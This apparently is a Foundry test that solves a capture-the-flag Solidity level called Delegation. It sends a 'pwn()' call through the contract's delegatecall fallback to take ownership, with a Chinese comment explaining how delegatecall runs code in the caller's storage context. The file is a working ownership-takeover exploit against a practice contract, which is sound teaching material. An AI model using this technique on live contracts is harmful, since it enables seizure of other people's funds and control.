// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";

contract DelegationTest is Test {
    address public owner;
    address public player;
    Delegate public delegate;
    Delegation public delegation;

    function setUp() public {
        owner = makeAddr("owner");
        player = makeAddr("player");

        console.log(owner);
        console.log(player);

        vm.startPrank(owner);

        delegate = new Delegate(owner);
        delegation = new Delegation(address(delegate));

        vm.stopPrank();
    }

    function testDelegation() public {
        vm.startPrank(player);

        /*
        而当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。
        合约B必须和目标合约C的变量存储布局必须相同
        */

        (bool result,) = address(delegation).call(abi.encodeWithSignature("pwn()"));

        assert(result);

        console.log(delegation.owner());

        assert(delegation.owner() == player);

        vm.stopPrank();
    }
}